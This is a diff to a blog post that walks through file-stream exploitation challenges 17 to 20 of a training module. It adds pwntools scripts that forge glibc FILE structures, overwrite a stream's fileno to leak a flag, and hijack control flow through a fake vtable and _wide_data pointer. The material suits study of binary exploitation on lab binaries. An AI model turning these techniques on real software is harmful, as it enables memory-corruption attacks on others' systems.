@@ -10,6 +10,12 @@ categories: jekyll update
 {:toc}
 ## Overview
 
+This module deals with file stream exploitation techniques. Overall, I found this module very good - it teaches material that isn't documented well on the internet, in a very deductive way. It also teaches some non trivial tricks, that are important to know. \
+I do think this module has potential to be much more challenging, having more complicated and realistic scenarios such as more binaries as PIE, full RELRO, no leaks at all, etc. The fact that all challenges may be solved without FSOP is abit disappointing. In particular, challenges 18-20 were all literally the same, and were solved in a trivial `wide_data` arbitrary branch primitive. \
+Nevertheless, it is a good module I'd recommend. 
+
+## Background
+
 Recall how file descriptors work. \
 A `fd` is just an entry within the `process file table` in the kernel. The `process file table` entries contains pointers to the kernel's `global file table`, which aggregates all open files within the system. An entry within the `global file table` contains the `file struct`, as well as `inode ptr`, `offset` (where in the file we're currently accessing) and more. \
 Every time we would issue `read, write` operations, a context switch would be performed, and all of the above dereference chain would be triggered - non trivial amount of work. 
@@ -711,12 +717,98 @@ def exploit():
 ## Challenge 17
 
 Now we don't have `libc` leak. We do have `fwrite` option, hence stream read primitive.
-Moreover, finally there are no `win` or `auth` methods, the binary is FULL RELRO, canary, NX and PIE. 
+Moreover, finally there are no `win` or `auth` methods, the binary is FULL RELRO, canary, NX and PIE.\
+There is `open_flag` method tho. This is interesting, as it simply `fopens` the flag file and does nothing with it. 
+
+Under the hood, the newly opened file should be added to the file stream linked list. \
+Moreover, we can overwrite our own file's `fd` so that we would leak data from the stream towards some program's buffer, and then leak it towards `stdout`.
+
+```python
+def exploit():
+    p = process(BINARY)
+    p.recvuntil(b'quit):\n')
+    open_flag(p)
+    note_size = 0x80
+    note_index, note_addr = new_note(p, 0, note_size)
+    print(f'note_index: {note_index} note_addr: {hex(note_addr)}')
+
+    fp_addr = open_file(p)
+    print(f'fp_addr: {hex(fp_addr)}')
+
+    intermediate_buf_size = note_size + 1  # Must be absolutely larger. Otherwise, no buffering write would occur
+    fp = FileStructure()
+    fp.read(note_addr, intermediate_buf_size)  # We'd use the write primitive to overwrite stdout stream
+    fp.fileno = 3  # TODO: check this
+    fp_bytes = bytes(fp)
+    write_fp(p, fp_bytes[:115])
+    read_file(p, 0, b'', should_send_buf=False)
+
+    intermediate_buf_size = note_size + 1  # Must be absolutely larger. Otherwise, no buffering write would occur
+    fp2 = FileStructure()
+    fp2.write(note_addr, intermediate_buf_size)  # We'd use the write primitive to overwrite stdout stream
+    fp_bytes = bytes(fp2)
+    write_fp(p, fp_bytes[:115])
+    write_file(p, 0)
+```
+
+## Challenge 18
+
+Now we have no leaks, `win` function, and partial RELRO.. de-ja-vuu? Nope. Now don't have any write primitive, as `read_file` isn't being used. 
+
+My idea is a similar approach to 7 - redirect control flow using the `wide_data` trick. My goal is to use virtual methods that are being used within `fclose`. Notice that since we have `write_file` option, we can also use the virtual methods used within `fwrite`. \
+I've used the last qword of an allocated note as the `_lock` pointer, being null & writeable region. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    win_addr = p.elf.symbols['win']
+    print(f'win_addr:{hex(win_addr)}')
+    p.recvuntil(b'quit):\n')
+    
+    note_size = 0x100
+    note_index, note_addr = new_note(p, 0, note_size)
+    print(f'note_index: {note_index} note_addr: {hex(note_addr)}')
+
+    fp_addr = open_file(p)
+    print(f'fp_addr: {hex(fp_addr)}')
+
+    p.sendline(b'write_fp')  # TODO: we can have additional leaks from it
+    p.recvuntil(b'_chain')
+    p.recvuntil(b' = ')
+    libc_stderr_leak = int(p.readline()[:-1], 16)
+    libc_base = libc_stderr_leak - libc.symbols['_IO_2_1_stderr_']
+    assert(libc_base & 0xfff == 0)
+    print(f'libc_base: {hex(libc_base)}')
+    
+    fake_lock_addr = note_addr + note_size - 0x10
+    fake_vtable_addr = libc_base + 0x1e88a0 + 1368 - 0x38  # first component is offset to the vtables array, second to the _IO_wfile_overflow, and third to support [vptr+0x38] adjustment
+    fp = FileStructure()
+    fp.flags = 0x64726f7773736170
+    fp._IO_read_ptr = 0
+    fp._IO_read_end = fp_addr - 0xe0 - 0x68 + 224 + 24  # fake vtable
+    fp._IO_read_base = win_addr
+    fp._wide_data = fp_addr - 0xe0 + 16 # subtract so we would only point to the vtable
+    fp._lock = fake_lock_addr
+    fp.vtable = fake_vtable_addr  # sub the offset to _IO_new_file_xsputn
+    fp_bytes = bytes(fp)
+    print(f'fp: {fp} fp_bytes: {fp_bytes} len: {len(fp_bytes)}')
+    p.send(fp_bytes)
+    p.recvuntil(b'quit):\n')
+
+    write_file(p, 0)
+    p.interactive()
+```
+
+## Challenge 19
+
+Exact solution as 18. 
+
+## Challenge 20
 
 We can redirect code flow by exploiting the `wide_data`. Since we can open multiple streams, we can do so multiple times, chaining ROP gadgets for each iteration. \
 Moreover, we can also use FSOP - chain multiple streams, where each would execute a single gadget, then call `close_file` on all of them. 
 
-
+However, all of these are much more hardcore solutions than needed.. As challenge 18 solution works here too.
 
 
 [angry-fsrop]: https://blog.kylebot.net/2022/10/22/angry-FSROP
